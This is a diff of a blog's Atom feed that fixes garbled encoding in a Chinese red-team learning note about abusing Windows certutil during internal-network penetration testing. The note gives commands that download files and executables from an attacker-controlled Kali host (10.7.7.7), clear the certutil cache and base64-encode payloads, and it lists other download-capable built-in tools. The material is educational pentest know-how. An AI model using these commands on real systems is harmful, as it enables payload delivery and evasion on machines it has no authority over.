@@ -6,7 +6,7 @@
   <link href="https://ey404.github.io/atom.xml" rel="self"/>
   
   <link href="https://ey404.github.io/"/>
-  <updated>2021-04-01T12:07:22.219Z</updated>
+  <updated>2021-04-01T12:18:49.130Z</updated>
   <id>https://ey404.github.io/</id>
   
   <author>
@@ -17,32 +17,32 @@
   <generator uri="https://hexo.io/">Hexo</generator>
   
   <entry>
-    <title>��������͸ѧϰ�ʼǡ�02��������͸�е�certutil</title>
+    <title>【内网渗透学习笔记】02、内网渗透中的certutil</title>
     <link href="https://ey404.github.io/2021/04/01/intranet02/"/>
     <id>https://ey404.github.io/2021/04/01/intranet02/</id>
     <published>2021-04-01T12:04:25.000Z</published>
-    <updated>2021-04-01T12:07:22.219Z</updated>
+    <updated>2021-04-01T12:18:49.130Z</updated>
     
-    <content type="html"><![CDATA[<h2 id="����"><a href="#����" class="headerlink" title="����"></a>����</h2><p>Windows�е����ó���Certutil.exe ����Ϊ֤������һ���ֽ��а�װ��ʹ�ô˳��������Windows�а�װ�����ݡ�ɾ���������Լ�ִ��֤����صĸ��ֹ��ܡ�</p><p><strong>Certutil���Դ�Զ��<code>URL</code>����֤����κ������ļ���</strong></p><h2 id="���صĳ��÷���"><a href="#���صĳ��÷���" class="headerlink" title="���صĳ��÷���"></a>���صĳ��÷���</h2><ul><li>����</li></ul><p>kali��IP��10.7.7.7��</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server <span class="number">80</span><span class="comment">##python3</span></span><br><span class="line">python -m SimpleHTTPServer <span class="number">80</span><span class="comment">##python2</span></span><br></pre></td></tr></table></figure><ul><li><ol><li>�����ڵ�ǰ·�����ļ�����ͬURL</li></ol></li></ul><p><code>example</code>:</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil -urlcache -split -f http://<span class="number">10</span>.<span class="number">7</span>.<span class="number">7</span>.<span class="number">7</span>/test.txt</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/imageimage-20210401151204777.png" alt="image-20210401151204777"></p><ul><li>2)�����ڵ�ǰ·����ָ���ļ����Ʊ���</li></ul><p><code>example</code>:</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil -urlcache -split -f http://<span class="number">10</span>.<span class="number">7</span>.<span class="number">7</span>.<span class="number">7</span>/test.txt  a.txt</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/imageimage-20210401151741297.png" alt="image-20210401151741297"></p><ul><li>3)�����ڻ���Ŀ¼���������</li></ul><p>����Ŀ¼λ�ã�</p><p><code>%USERPROFILE%\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content</code></p><p><code>example</code>:</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil -urlcache -f http://<span class="number">10</span>.<span class="number">7</span>.<span class="number">7</span>.<span class="number">7</span>/test.txt</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/imageimage-20210401152512141.png" alt="image-20210401152512141"></p><ul><li>4)֧�ֱ���������ļ�</li></ul><p><code>example</code>:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil -urlcache -split -f http:&#x2F;&#x2F;10.7.7.7&#x2F;test.exe</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/imageimage-20210401152823463.png" alt="image-20210401152823463"></p><h2 id="��������l�"><a href="#��������l�" class="headerlink" title="��������ļ�"></a>��������ļ�</h2><ul><li>�鿴������Ŀ</li></ul><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil -urlcache *</span><br></pre></td></tr></table></figure><ul><li>ɾ��������Ŀ</li></ul><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil -urlcache * <span class="keyword">delete</span></span><br></pre></td></tr></table></figure><h2 id="base64����ת��"><a href="#base64����ת��" class="headerlink" title="base64����ת��"></a>base64����ת��</h2><ul><li>1��base64���룺</li></ul><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutill -encode InFile Outfile</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/imageimage-20210401163137364.png" alt="image-20210401163137364"></p><p>�������ļ�������������ʶ��Ϣ��</p><p>�ļ�ͷ��</p><p><code>----BEGIN CERTIFICATE-----</code></p><p>�ļ�β��</p><p><code>-----END CERTIFICATE-----</code></p><p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/imageimage-20210401163309621.png" alt="image-20210401163309621"></p><ul><li>2)base64����</li></ul><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil -<span class="keyword">decode</span> <span class="keyword">InFile</span> <span class="keyword">OutFile</span></span><br></pre></td></tr></table></figure><h2 id="С��"><a href="#С��" class="headerlink" title="С��"></a>С��</h2><p>��Ҫ�ܽ���certutil�ļ������ط��������ҽ�����base64����ת���ĳ��÷�����</p><p><code>Windows</code>�����ļ���������չ��</p><ul><li>bitsadmin</li><li>powershell</li><li>mshta</li><li>regsvr32</li><li>csc</li><li>vbs</li><li>wget</li><li>ftp</li><li>debug</li><li>tftp</li></ul>]]></content>
+    <content type="html"><![CDATA[<h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>Windows中的内置程序Certutil.exe ，作为证书服务的一部分进行安装。使用此程序可以在Windows中安装、备份、删除、管理以及执行证书相关的各种功能。</p><p><strong>Certutil可以从远程<code>URL</code>下载证书或任何其它文件。</strong></p><h2 id="下载的常用方法"><a href="#下载的常用方法" class="headerlink" title="下载的常用方法"></a>下载的常用方法</h2><ul><li>背景</li></ul><p>kali（IP：10.7.7.7）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server <span class="number">80</span><span class="comment">##python3</span></span><br><span class="line">python -m SimpleHTTPServer <span class="number">80</span><span class="comment">##python2</span></span><br></pre></td></tr></table></figure><ul><li><ol><li>保存在当前路径，文件名称同URL</li></ol></li></ul><p><code>example</code>:</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil -urlcache -split -f http://<span class="number">10</span>.<span class="number">7</span>.<span class="number">7</span>.<span class="number">7</span>/test.txt</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210401151204777.png" alt="image-20210401151204777"></p><ul><li>2)保存在当前路径，指定文件名称保存</li></ul><p><code>example</code>:</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil -urlcache -split -f http://<span class="number">10</span>.<span class="number">7</span>.<span class="number">7</span>.<span class="number">7</span>/test.txt  a.txt</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210401151741297.png" alt="image-20210401151741297"></p><ul><li>3)保存在缓存目录，名称随机</li></ul><p>缓存目录位置：</p><p><code>%USERPROFILE%\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content</code></p><p><code>example</code>:</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil -urlcache -f http://<span class="number">10</span>.<span class="number">7</span>.<span class="number">7</span>.<span class="number">7</span>/test.txt</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210401152512141.png" alt="image-20210401152512141"></p><ul><li>4)支持保存二进制文件</li></ul><p><code>example</code>:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil -urlcache -split -f http:&#x2F;&#x2F;10.7.7.7&#x2F;test.exe</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210401152823463.png" alt="image-20210401152823463"></p><h2 id="清除下载文件"><a href="#清除下载文件" class="headerlink" title="清除下载文件"></a>清除下载文件</h2><ul><li>查看缓存项目</li></ul><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil -urlcache *</span><br></pre></td></tr></table></figure><ul><li>删除缓存项目</li></ul><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil -urlcache * <span class="keyword">delete</span></span><br></pre></td></tr></table></figure><h2 id="base64编码转换"><a href="#base64编码转换" class="headerlink" title="base64编码转换"></a>base64编码转换</h2><ul><li>1）base64编码：</li></ul><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutill -encode InFile Outfile</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210401163137364.png" alt="image-20210401163137364"></p><p>编码后的文件会添加两处标识信息：</p><p>文件头：</p><p><code>----BEGIN CERTIFICATE-----</code></p><p>文件尾：</p><p><code>-----END CERTIFICATE-----</code></p><p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210401163309621.png" alt="image-20210401163309621"></p><ul><li>2)base64解密</li></ul><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil -<span class="keyword">decode</span> <span class="keyword">InFile</span> <span class="keyword">OutFile</span></span><br></pre></td></tr></table></figure><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>主要总结了certutil的几种下载方法，并且介绍了base64编码转换的常用方法。</p><p><code>Windows</code>常见的几种下载拓展：</p><ul><li>bitsadmin</li><li>powershell</li><li>mshta</li><li>regsvr32</li><li>csc</li><li>vbs</li><li>wget</li><li>ftp</li><li>debug</li><li>tftp</li></ul>]]></content>
     
     
       
       
-    <summary type="html">&lt;h2 id=&quot;����&quot;&gt;&lt;a href=&quot;#����&quot; class=&quot;headerlink&quot; title=&quot;����&quot;&gt;&lt;/a&gt;����&lt;/h2&gt;&lt;p&gt;Windows�е����ó���Certutil.exe ����Ϊ֤������һ���ֽ��а�װ��ʹ�ô˳����</summary>
+    <summary type="html">&lt;h2 id=&quot;概念&quot;&gt;&lt;a href=&quot;#概念&quot; class=&quot;headerlink&quot; title=&quot;概念&quot;&gt;&lt;/a&gt;概念&lt;/h2&gt;&lt;p&gt;Windows中的内置程序Certutil.exe ，作为证书服务的一部分进行安装。使用此程序可以在Windows中安装、备份、删除、管理以</summary>
       
     
     
     
-    <category term="����ѧϰ�ʼ�" scheme="https://ey404.github.io/categories/%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%D1%A7%CF%B0%EF%BF%BD%CA%BC%EF%BF%BD/"/>
+    <category term="内网学习笔记" scheme="https://ey404.github.io/categories/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
     
     
-    <category term="���" scheme="https://ey404.github.io/tags/%EF%BF%BD%EF%BF%BD%EF%BF%BD/"/>
-    
-    <category term="ѧϰ�ʼ�" scheme="https://ey404.github.io/tags/%D1%A7%CF%B0%EF%BF%BD%CA%BC%EF%BF%BD/"/>
-    
-    <category term="������͸" scheme="https://ey404.github.io/tags/%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%CD%B8/"/>
+    <category term="红队" scheme="https://ey404.github.io/tags/%E7%BA%A2%E9%98%9F/"/>
     
     <category term="certutil" scheme="https://ey404.github.io/tags/certutil/"/>
+    
+    <category term="学习笔记" scheme="https://ey404.github.io/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
+    
+    <category term="内网渗透" scheme="https://ey404.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
     
   </entry>
   
@@ -69,11 +69,11 @@
     
     <category term="红队" scheme="https://ey404.github.io/tags/%E7%BA%A2%E9%98%9F/"/>
     
-    <category term="端口探测" scheme="https://ey404.github.io/tags/%E7%AB%AF%E5%8F%A3%E6%8E%A2%E6%B5%8B/"/>
-    
     <category term="学习笔记" scheme="https://ey404.github.io/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
     
     <category term="内网渗透" scheme="https://ey404.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
+    
+    <category term="端口探测" scheme="https://ey404.github.io/tags/%E7%AB%AF%E5%8F%A3%E6%8E%A2%E6%B5%8B/"/>
     
   </entry>
   
